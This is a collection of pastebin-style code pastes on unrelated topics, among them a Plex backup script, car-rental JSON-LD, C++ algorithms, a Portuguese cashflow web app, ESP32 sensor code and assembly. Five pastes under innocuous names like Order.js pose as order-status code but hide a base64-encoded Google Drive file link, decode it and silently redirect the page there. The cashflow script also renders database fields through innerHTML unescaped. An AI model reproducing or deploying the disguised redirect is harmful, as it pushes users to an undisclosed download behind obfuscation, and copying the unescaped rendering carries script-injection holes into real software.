        Add-Content -Path $logFile -Value ""[$(Get-Date)] Skipping $name: Source not found""
        $backupSuccess = $false
    }
}

Write-Host ""`rProgress: [####################] 100% - Backup complete!""

# Compress the backup into a single ZIP file
$zipFile = Join-Path $tempBackupDir ""$PlexServerName_Backup_$timestamp.zip""
& $sevenZipPath a -tzip $zipFile $tempBackupDir\* -r

# Move ZIP file to the destination
if (Test-Path $zipFile) {
    Move-Item -Path $zipFile -Destination $backupDestination
    Add-Content -Path $logFile -Value ""[$(Get-Date)] Backup moved to $backupDestination""
} else {
    $backupSuccess = $false
    Add-Content -Path $logFile -Value ""[$(Get-Date)] Backup failed: ZIP file not created""
}

# Delete temp backup files after moving the ZIP
Remove-Item -Path $tempBackupDir\* -Recurse

# Send success or failure email
if ($backupSuccess) {
    $emailSubject = ""[$PlexServerName] Backup Success""
    $emailBody = ""<html><body><h1 style='color:green;'>Backup completed successfully!</h1><p>The backup process for Plex Server was completed successfully. The backup has been moved to the backup destination.</p></body></html>""
} else {
    $emailSubject = ""[$PlexServerName] Backup Failed""
    $emailBody = ""<html><body><h1 style='color:red;'>Backup failed!</h1><p>The backup process for Plex Server encountered issues. Please review the logs for more details.</p></body></html>""
}

# Send email
Send-Email -subject $emailSubject -body $emailBody

# Retain log files based on retention policy
$logFiles = Get-ChildItem -Path $logFileDir -Filter ""PlexServerBackup_*.log"" | Sort-Object LastWriteTime
if ($logFiles.Count -gt $backupRetentionCount) {
    $logsToDelete = $logFiles | Select-Object -Skip $backupRetentionCount
    $logsToDelete | ForEach-Object { Remove-Item $_.FullName }
}

# Delete logs older than the retention period
$oldLogs = Get-ChildItem -Path $logFileDir -Filter ""PlexServerBackup_*.log"" | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-$logRetentionDays) }
$oldLogs | ForEach-Object { Remove-Item $_.FullName }

Stop-Transcript
"
2NkdWr7L,HCP - Skoda Fabia Combi Example,Korzunov,JSON,Thursday 17th of April 2025 04:22:20 AM CDT,"<script type=""application/ld+json"">
            {
               ""@context"": ""http://schema.org/"",
               ""@type"": ""Car"",
               ""name"": ""Škoda Fabia combi"",
               ""seatingCapacity"": ""5"",
               ""bodyType"": ""Station Wagon"",
               ""vehicleTransmission"": ""Manual"",
               ""fuelType"": ""Petrol"",
               ""fuelConsumption"": ""6.0 L/100 km"",
               ""description"": ""The Škoda Fabia Combi is a perfect choice if you're looking for a rental car in Prague that combines practicality, fuel efficiency, and ease of use. This small estate car offers a spacious cargo area, making it ideal for transporting luggage, shopping, or equipment during your trip. The Fabia Combi is also designed for navigating narrow streets and parking in tight spots, ensuring a stress-free driving experience in Prague's urban environment. Renting a Škoda Fabia is a smart decision, as the car is renowned for its low fuel consumption on both city roads and long journeys, making it an economical option for travelers. The Fabia Combi also excels in safety. Enhanced features like ABS, multiple airbags, stability control, and emergency braking systems ensure that every drive is secure, whether you're exploring Prague or venturing across the Czech Republic. With a Škoda Fabia Combi, you can enjoy peace of mind and a comfortable ride wherever your adventures take you."",
               ""image"": ""https://www.hirecarprague.com/gallery-image/p-main/media/1917/s-koda-fabia-iii-wagon-mt.jpeg"",
               ""brand"": ""Škoda"",
               ""model"": ""Fabia"",
               ""vehicleModelDate"": ""2018"", 
               ""vehicleConfiguration"": ""Ambition"",
               ""color"": ""Race Blue Metallic"",
               ""numberOfDoors"": 5,
               ""vehicleInteriorColor"": ""Black"",
               ""vehicleSeatingCapacity"": 5,
               ""driveWheelConfiguration"": ""https://schema.org/FrontWheelDriveConfiguration"",
               ""vehicleIdentificationNumber"": ""WAUZZZF44HA021156"",
      		   ""mileageFromOdometer"": {
      		      ""@type"": ""QuantitativeValue"",
      		      ""value"": ""20170"",
      		      ""unitCode"": ""KMT""
      		      },
               ""itemCondition"": ""https://schema.org/UsedCondition"",        
               ""offers"": {
                 ""@type"": ""Offer"",
                 ""offeredBy"": {
                    ""@type"": ""AutoRental"",
                    ""name"": ""HCP Hire Car Prague"",
                    ""telephone"": ""+420 212 241 723"",
                    ""address"": ""Prague, Příčná 1892/4"",
                    ""priceRange"": ""$$"",	              
                    ""url"": ""https://www.hirecarprague.com/""
                  },
                  ""price"": ""25"",
                  ""priceSpecification"": {
                    ""@type"": ""PriceSpecification"",                  
                    ""minPrice"": ""25"",
                    ""maxPrice"": ""89"",
                    ""priceCurrency"": ""EUR""
                  },              
                  ""priceCurrency"": ""EUR"",        
                  ""availability"": ""InStock"",
                  ""priceValidUntil"": ""YYYY-MM-DD"",
                  ""url"": ""https://www.hirecarprague.com/rent-fabia-combi""
                  },          
          ""sku"": ""cID"",
          ""mpn"": ""cID""
        }
        </script>"
xLQfxPqe,binary bor,slash0t,C++,Thursday 17th of April 2025 04:13:00 AM CDT,"struct bor {
    const static int al = 2;
    const static int a = 0;

    struct node {
        node* to[al];
        int visited;

        node() {
            memset(to, 0, sizeof(to));
            visited = 0;
        }

        node* go(int goal) {
            if (this->to[goal] == nullptr) {
                this->to[goal] = new node();
            }
            return this->to[goal];
        }
    };

    node* root;

    bor() {
        root = new node();
    }

    node* add(int num, int index) {
        node* now = root;
        for (int i = sz - 1; i >= 0; i--) {
            int bit = (num >> i) & 1;
            now = now->go(bit);
            now->visited = index;
        }
        return now;
    }
};"
3jH2aJk7,Order.js,Epiphemeral,JavaScript,Thursday 17th of April 2025 04:11:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95346/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
27h9fYiW,Market.js,Epiphemeral,JavaScript,Thursday 17th of April 2025 03:56:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42551/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
15SwC3jw,Square_Root_Decomposition,Araf_12,C++,Thursday 17th of April 2025 03:52:52 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;

int main() {
    int n, ara[1000], block[1000] = {}, block_size;
    cin >> n;
    block_size = sqrt(n);
    
    // Input array elements
    for (int i = 0; i < n; i++) {
        cin >> ara[i];
    }
    
    // Calculate the blocks
    for (int i = 0; i < n; i++) {
        block[i / block_size] += ara[i];
    }
    
    cout << ""block size: "" << block_size << endl;
    
    int q;
    cin >> q;
    
    while (q--) {
        int op, x, y;
        cin >> op >> x >> y;
        
        if (op == 1) {
            // Update operation
            ara[x] += y;
            block[x / block_size] += y;
        } else {
            // Query operation (range sum)
            int sum = 0;
            for (int i = x; i <= y; ) {
                if (i % block_size == 0 && i + block_size - 1 <= y) {
                    sum += block[i / block_size];
                    i += block_size;
                } else {
                    sum += ara[i];
                    i++;
                }
            }
            cout << sum << endl;
        }
    }
    
    return 0;
}"
23FVu5hm,cashflow_server.js,tool684,JavaScript,Thursday 17th of April 2025 03:51:16 AM CDT,"const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const XLSX = require('xlsx');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 3002;

// Configurar middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir ficheiros estáticos de /var/www/html/cashflow/
//app.use(express.static('/var/www/html/cashflow'));
app.use('/cashflow', express.static(path.join(__dirname)));

// Configurar multer para upload de ficheiros
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, '/var/www/html/cashflow/');
    },
    filename: (req, file, cb) => {
        cb(null, 'upload.xlsx');
    }
});
const upload = multer({ storage });

// Conectar ao banco de dados SQLite
const db = new sqlite3.Database('/var/www/html/cashflow/cashflow.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao SQLite:', err.message);
    } else {
        console.log('Conectado ao banco de dados SQLite.');
    }
});

// Função para converter data serial do Excel para YYYY-MM-DD
function excelSerialToDate(serial) {
    const utc_days = Math.floor(serial - 25569);
    const date = new Date(utc_days * 86400 * 1000);
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    return `${year}-${month}-${day}`;
}

// Endpoint para obter dados com filtros
app.get('/api/transactions', (req, res) => {
    const { startDate, endDate, categoria, sub_categoria, search } = req.query;
    let query = 'SELECT * FROM cashflow WHERE 1=1';
    const params = [];

    if (startDate) {
        query += ' AND data_operacao >= ?';
        params.push(startDate);
    }
    if (endDate) {
        query += ' AND data_operacao <= ?';
        params.push(endDate);
    }
    if (categoria) {
        query += ' AND categoria = ?';
        params.push(categoria);
    }
    if (sub_categoria) {
        query += ' AND sub_categoria = ?';
        params.push(sub_categoria);
    }
    if (search) {
        query += ' AND (descricao LIKE ? OR destino LIKE ?)';
        params.push(`%${search}%`, `%${search}%`);
    }

    db.all(query, params, (err, rows) => {
        if (err) {
            res.status(500).json({ error: err.message });
            return;
        }
        res.json(rows);
    });
});

// Endpoint para importar Excel
app.post('/api/import', upload.single('excel'), (req, res) => {
    const filePath = path.join('/var/www/html/cashflow/', 'upload.xlsx');
    if (!req.file) {
        res.status(400).json({ error: 'Nenhum ficheiro Excel enviado.' });
        return;
    }

    try {
        const workbook = XLSX.readFile(filePath);
        const sheet = workbook.Sheets[workbook.SheetNames[0]];
        const data = XLSX.utils.sheet_to_json(sheet);

        db.serialize(() => {
            const stmt = db.prepare(`
                INSERT INTO cashflow (data_operacao, descricao, montante, destino, categoria, sub_categoria)
                VALUES (?, ?, ?, ?, ?, ?)
            `);

            let successCount = 0;
            let errorCount = 0;

            data.forEach((row) => {
                try {
                    const data_operacao = excelSerialToDate(row['Data Operação']);
                    const descricao = row['Descrição'] || '';
                    const montante = parseFloat(row['Montante']);
                    const destino = row['Destino'] || '';
                    let categoria = 'n/a';
                    let sub_categoria = 'n/a';

                    if (row['Categoria'] && row['Categoria'] !== 'n/a') {
                        const [cat, sub] = row['Categoria'].split('-');
                        categoria = cat || 'n/a';
                        sub_categoria = sub || 'n/a';
                    }

                    stmt.run(
                        data_operacao,
                        descricao,
                        montante,
                        destino,
                        categoria,
                        sub_categoria,
                        (err) => {
                            if (err) {
                                errorCount++;
                                console.error('Erro ao inserir linha:', err.message);
                            } else {
                                successCount++;
                            }
                        }
                    );
                } catch (err) {
                    errorCount++;
                    console.error('Erro ao processar linha:', err.message);
                }
            });

            stmt.finalize();
            fs.unlinkSync(filePath);
            res.json({ success: successCount, errors: errorCount });
        });
    } catch (err) {
        res.status(500).json({ error: 'Erro ao processar o ficheiro Excel: ' + err.message });
    }
});

// Iniciar servidor
app.listen(port, () => {
    console.log(`Servidor Node.js a correr em http://localhost:${port}`);
});"
NUD0mL0P,script.js,tool684,JavaScript,Thursday 17th of April 2025 03:50:41 AM CDT,"// Função para converter YYYY-MM-DD para DD/MM/YYYY
function formatDate(dateStr) {
    const [year, month, day] = dateStr.split('-');
    return `${day}/${month}/${year}`;
}

// Carregar dados com filtros
async function loadData() {
    console.log('Carregando dados...');
    const startDate = document.getElementById('startDate').value;
    const endDate = document.getElementById('endDate').value;
    const categoria = document.getElementById('categoria').value;
    const subCategoria = document.getElementById('subCategoria').value;
    const search = document.getElementById('search').value;

    const params = new URLSearchParams();
    if (startDate) params.append('startDate', startDate);
    if (endDate) params.append('endDate', endDate);
    if (categoria) params.append('categoria', categoria);
    if (subCategoria) params.append('sub_categoria', subCategoria);
    if (search) params.append('search', search);

    try {
        const response = await fetch(`/cashflow/api/transactions?${params.toString()}`, {
            method: 'GET',
            credentials: 'same-origin'
        });
        if (!response.ok) {
            throw new Error(`Erro na requisição: ${response.status}`);
        }
        const data = await response.json();
        console.log('Dados recebidos:', data);

        const tbody = document.getElementById('transactionsBody');
        tbody.innerHTML = '';

        data.forEach(row => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>${formatDate(row.data_operacao)}</td>
                <td>${row.descricao}</td>
                <td>${row.montante.toFixed(2)}</td>
                <td>${row.destino}</td>
                <td>${row.categoria}</td>
                <td>${row.sub_categoria}</td>
            `;
            tbody.appendChild(tr);
        });
    } catch (error) {
        console.error('Erro ao carregar dados:', error);
        alert('Erro ao carregar dados: ' + error.message);
    }
}

// Upload de ficheiro Excel
async function uploadExcel() {
    console.log('Iniciando upload...');
    const fileInput = document.getElementById('excelFile');
    const file = fileInput.files[0];
    if (!file) {
        console.error('Nenhum ficheiro selecionado');
        alert('Selecione um ficheiro Excel!');
        return;
    }

    const formData = new FormData();
    formData.append('excel', file);

    try {
        const response = await fetch('/cashflow/api/import', {
            method: 'POST',
            body: formData,
            credentials: 'same-origin'
        });
        if (!response.ok) {
            throw new Error(`Erro no upload: ${response.status}`);
        }
        const result = await response.json();
        console.log('Resultado do upload:', result);
        alert(`Importados ${result.success} registos com ${result.errors} erros.`);
        loadData();
    } catch (error) {
        console.error('Erro ao fazer upload:', error);
        alert('Erro ao fazer upload: ' + error.message);
    }
}

// Carregar dados iniciais
window.onload = () => {
    console.log('Página carregada, inicializando...');
    loadData();
};"
XetS222V,VL53L0X_GC9A01A_ESP32C6,Tywais,C++,Thursday 17th of April 2025 03:50:09 AM CDT,"// GOOD FOR ESP32CS DEV MODULE

#include <Wire.h>
#include <Adafruit_GC9A01A.h>
#include <Adafruit_GFX.h>
#include <VL53L0X.h>

// Define the Pins for the Display
#define TFT_CS        5    // Chip select pin
#define TFT_RST       1    // Reset pin
#define TFT_DC        0    // Data/Command pin
int distance = 0;
int radiusmap = 0;
int centerX;
int centerY;

VL53L0X sensor;

// Create an instance of the display
Adafruit_GC9A01A tft = Adafruit_GC9A01A(TFT_CS, TFT_DC, TFT_RST);

void setup() {
  Serial.begin(115200);
  Wire.setPins( 14,  15);
  Wire.begin();
 
  sensor.setTimeout(500);
  if (!sensor.init())
  {
    Serial.println(""Failed to detect and initialize sensor!"");
    while (1) {}
  }

  sensor.setTimeout(500);
  if (!sensor.init())
  {
    Serial.println(""Failed to detect and initialize sensor!"");
    while (1) {}
  }
  sensor.startContinuous();

  tft.begin();                   // Initialize the display
  tft.setRotation(0);            // Set the rotation of the display
  tft.fillScreen(GC9A01A_BLACK); // Fill the screen with black color

  // Draw a circle
  centerX = tft.width() / 2;  // Center x of the display
  centerY = tft.height() / 2; // Center y of the display
  int diameter = 240;
  int radius = diameter/2; 
 
  tft.drawCircle(centerX, centerY, radius-10, GC9A01A_RED); 

  tft.setTextColor(GC9A01A_GREEN,GC9A01A_BLACK);
  tft.setTextSize(2);
}

void loop() {
  distance = sensor.readRangeContinuousMillimeters();
  if (sensor.timeoutOccurred()) { Serial.print("" TIMEOUT""); }

  Serial.println();
  
  if (distance > 500) {
    distance = 500;
  }
  Serial.println(distance);
  radiusmap = map(distance,0,500,0,120);  //convert distance to radius
  tft.fillScreen(GC9A01A_BLACK);          // Fill the screen with black color
  tft.drawCircle(centerX, centerY, radiusmap, GC9A01A_RED); 

  tft.setTextColor(GC9A01A_GREEN,GC9A01A_BLACK);
  tft.setTextSize(2);

  tft.setCursor(105, 110); // Set cursor position
  tft.print(distance);
  delay(250);

}"
Bw00C2Wi,cashflow.html,tool684,HTML,Thursday 17th of April 2025 03:48:40 AM CDT,"<!DOCTYPE html>
<html lang=""pt-PT"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Cashflow Dashboard</title>
    <link rel=""stylesheet"" href=""./styles.css"">
</head>
<body>
    <h1>Cashflow Dashboard</h1>
    <div class=""filters"">
        <label>Data Início: <input type=""date"" id=""startDate""></label>
        <label>Data Fim: <input type=""date"" id=""endDate""></label>
        <label>Categoria: <input type=""text"" id=""categoria""></label>
        <label>Sub-Categoria: <input type=""text"" id=""subCategoria""></label>
        <label>Pesquisar: <input type=""text"" id=""search"" placeholder=""Descrição ou Destino""></label>
        <button onclick=""loadData()"">Filtrar</button>
    </div>
    <div class=""upload"">
        <h3>Importar Excel</h3>
        <input type=""file"" id=""excelFile"" accept="".xlsx"">
        <button onclick=""uploadExcel()"">Carregar</button>
    </div>
    <table id=""transactionsTable"">
        <thead>
            <tr>
                <th>Data Operação</th>
                <th>Descrição</th>
                <th>Montante (€)</th>
                <th>Destino</th>
                <th>Categoria</th>
                <th>Sub-Categoria</th>
            </tr>
        </thead>
        <tbody id=""transactionsBody""></tbody>
    </table>
    <script src=""./script.js""></script>
</body>
</html>"
w57rjy0U,Untitled,Epiphemeral,JavaScript,Thursday 17th of April 2025 03:41:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54259/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0vUDv83T,LST-6042,Luxup,HTML,Thursday 17th of April 2025 03:33:09 AM CDT,"	Закомментировать или удалить:
<div id=""adfox_170980130519153321""></div>
<!-- Закоментировано под нового рекламного провайдера luxup -->
<!--
<div id=""adfox_170980079779199858""></div>
-->
<script>
  window.yaContextCb.push(() => {
      if (window.innerWidth >= 970 && window.innerWidth <= 3000) {
        // вызов FloorAd для десктопной версии
        Ya.adfoxCode.create({
          ownerId: 722840,
          containerId: 'adfox_170980130519153321',
          type: 'floorAd',
          platform: 'desktop',
            params: {
              p1: 'dbjzg',
              p2: 'iwuq'
            }
        });
      } else if (window.innerWidth <= 970) {
        // вызов FloorAd для мобильной версии
        // Закоментировано под нового рекламного провайдера luxup
        // Ya.adfoxCode.create({
        //   ownerId: 722840,
        //   containerId: 'adfox_170980079779199858',
        //   type: 'floorAd',
        //   platform: 'touch',
        //     params: {
        //       p1: 'dbjyw',
        //       p2: 'iwui'
        //     }
        // });
      }
  });    
</script>
"
7S8pt3xE,Products.js,Epiphemeral,JavaScript,Thursday 17th of April 2025 03:25:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35695/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ymAf66T8,Order.js,Epiphemeral,JavaScript,Thursday 17th of April 2025 03:10:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36508/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
53TZwgP9,Untitled,ksieradzinski,Python,Thursday 17th of April 2025 02:57:30 AM CDT,"# 1. Z pliku transakcje.txt wybierz tylko te, które mają dodatnią wartość
# a) Otwórz plik transakcje.txt
# b) Przejdź po wierszach tego pliku
# c) Sprawdzaj czy w kolumnie z wartością znajdują się wartości dodatnie
# d) Jeśli tak to je wyświetlaj

# 2. Zapisz je do osobnego pliku o nazwie przychody.txt

# 3. Napisz program, który otworzy plik przychody.txt,
# odczyta wartości zapisane w kolejnych wierszach i wyświetli ich sumę.

import csv

# print(""LINIA"")
# with open(""transakcje.txt"", ""r"", encoding=""utf8"") as file:
#     for line in file:
#         print(line.strip().split("";""))

print(""READER"")
# with open(""transakcje.txt"", ""r"", encoding=""utf8"") as file:
#     with open(""przychody.txt"", ""a"", encoding=""utf8"", newline="""") as output_file:
with (open(""transakcje.txt"", ""r"", encoding=""utf8"") as file,
      open(""przychody.txt"", ""w"", encoding=""utf8"", newline="""") as output_file):
        reader = csv.reader(file, delimiter="";"")
        for line in reader:
            name, amount, date = line
            if float(amount) > 0:
                print(line)
                writer = csv.writer(output_file, delimiter="";"")
                writer.writerow(line)
"
AjLJU5s4,Untitled,Artychenal,6502 TASM/64TASS,Thursday 17th of April 2025 02:54:46 AM CDT,"DATA SEGMENT
    messtr       DB 0Dh, 0Ah, ""Hello! Let`s solve piecewise function with your values"", 0Dh, 0Ah, ""$""
    funct        DB "" { x-1, if x < 10"", 0Dh, 0Ah, ""Z= { (3x^2+4)/(x-2), if x = 10"", 0Dh, 0Ah, "" { (7x^2-56)/(2x-5), if x > 10"", 0Dh, 0Ah, ""$""
    xreadmes     DB ""Input value of x (in range -32767...32767) -> $""
    xinmes       DB 7,?, 7 DUP ("" "")
    menuhold     DB 2,?, 2 DUP ("" "")
    xvalue       DW ?
    outmes       DB ""Result: $""
    newline      DB 0Dh,0Ah,""$""
    errmsg       DB 0Dh, 0Ah, ""Invalid input!"", 0Dh, 0Ah, ""$""
    range_err    DB ""Number out of range!"", 0Dh, 0Ah, ""$""
    overflow_err DB ""Calculation overflow occurred!"", 0Dh, 0Ah, ""$""
    ostacha_msg  DB "" reminder $""
    end_msg      DB ""Do you want to continue? (y/n): $""
    result       DW ?
    remainder    DW ?
    numerator    DW ?
    denominator  DW ?
    sign_flag    DB 0
    temp_reg     DW ?                                                                                                                             ; Added temporary register to handle larger calculations
DATA ENDS
STSEG SEGMENT PARA STACK ""STACK""
          DB 64 DUP ( ""STACK"" )
STSEG ENDS
CODE SEGMENT
                         ASSUME CS:CODE, DS:DATA, SS:STSEG
    START:               
                         MOV    AX, DATA
                         MOV    DS, AX
                         CALL   WELC_PROC
                         CALL   FUNC
                         CALL   PRINTING
                         CALL   END_PROGRAM
                         MOV    AH, 10
                         INT    21h
WELC_PROC PROC
                         MOV    DX, OFFSET messtr
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET funct
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET xreadmes
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET xinmes
                         MOV    AH, 10
                         INT    21h
                         CALL   CHECK_INPUT
                         MOV    SI, OFFSET xinmes
                         ADD    SI, 2
                         CALL   CONVERT
                         MOV    xvalue, BX
                         MOV    sign_flag, 0
                         RET
WELC_PROC ENDP
CHECK_INPUT PROC
                         MOV    SI, DX
                         MOV    CL, [SI+1]
                         MOV    BL, 0
                         ADD    SI, 2
                         MOV    AL, [SI]
                         CMP    AL, '-'
                         JNE    CHECK_DIGITS
                         MOV    sign_flag, 1
                         INC    SI
                         DEC    CX
                         JZ     INVALID_INPUT
    CHECK_DIGITS:        
                         MOV    AL, [SI]
                         CMP    CX, 0
                         JZ     END_CHECK
    CHECK_LOOP:          
                         MOV    AL, [SI]
                         CMP    AL, '0'
                         JB     INVALID_INPUT
                         CMP    AL, '9'
                         JA     INVALID_INPUT
                         INC    BL
                         INC    SI
                         DEC    CX
                         JNZ    CHECK_LOOP
                         CMP    BL, 0
                         JZ     INVALID_INPUT
                         JMP    END_CHECK
    INVALID_INPUT:       
                         MOV    DX, OFFSET errmsg
                         MOV    AH, 9
                         INT    21h
                         JMP    END_ERROR
    END_ERROR:           
                         JMP    START
    END_CHECK:           
                         RET
CHECK_INPUT ENDP
CHECK_RANGE PROC
                         CMP    sign_flag, 0
                         JE     CHECK_NEGATIVE
                         NEG    AX
                         CMP    remainder, 0
                         JNE    CHECK_NEGATIVE
                         CMP    DX, 0
                         JNE    RANGE_ERROR
    CHECK_NEGATIVE:      
                         CMP    AX, 32767
                         JA     RANGE_ERROR
                         CMP    sign_flag, 0
                         JNE    NEG_N
                         RET
    RANGE_ERROR:         
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         CALL   END_PROGRAM
    NEG_N:               
                         NEG    AX
                         RET
CHECK_RANGE ENDP
CHECK_RANGE_RESULT PROC
                         MOV    AX, result
                         CMP    AX, -32768
                         JA     RANGE_ERROR_RES
                         CMP    AX, 32752
                         JG     RANGE_ERROR_RES
                         RET
    RANGE_ERROR_RES:     
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START
CHECK_RANGE_RESULT ENDP
CONVERT PROC
                         XOR    AX, AX
                         XOR    BX, BX
                         PUSH   AX
                         PUSH   BX
                         PUSH   CX
                         PUSH   DX
                         MOV    BX, 0
                         CMP    sign_flag, 1
                         JNE    CONVERT_LOOP
                         INC    SI
                         DEC    CX
    CONVERT_LOOP:        
                         MOV    AL, [SI]
                         CMP    AL, '0'
                         JB     CONVERT_END
                         CMP    AL, '9'
                         JA     CONVERT_END
                         SUB    AL, '0'
                         MOV    AH, 0
                         PUSH   AX
                         MOV    AX, BX
                         MOV    CX, 10
                         MUL    CX
                         CMP    DX, 0
                         JNE    OVERFLOW_ERROR
                         MOV    BX, AX
                         POP    AX
                         ADD    BX, AX
                         INC    SI
                         JMP    CONVERT_LOOP
    OVERFLOW_ERROR:      
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START
    CONVERT_END:         
                         CMP    sign_flag, 1
                         JNE    CONVERT_FINISH
                         NEG    BX
    CONVERT_FINISH:      
                         MOV    AX, BX
                         CALL   CHECK_RANGE
                         POP    DX
                         POP    CX
                         POP    BX
                         MOV    BX, AX
                         POP    AX
                         RET
CONVERT ENDP
RET_PROC PROC
                         CALL   START
RET_PROC ENDP
FUNC PROC
                         XOR    AX, AX
                         MOV    AX, xvalue

    ; Compare x with 10
                         CMP    AX, 10
                         JL     CASE_LESS_THAN_10             ; If x < 10
                         JE     CASE_EQUAL_10                 ; If x = 10
                         JG     CASE_GREATER_THAN_10          ; If x > 10

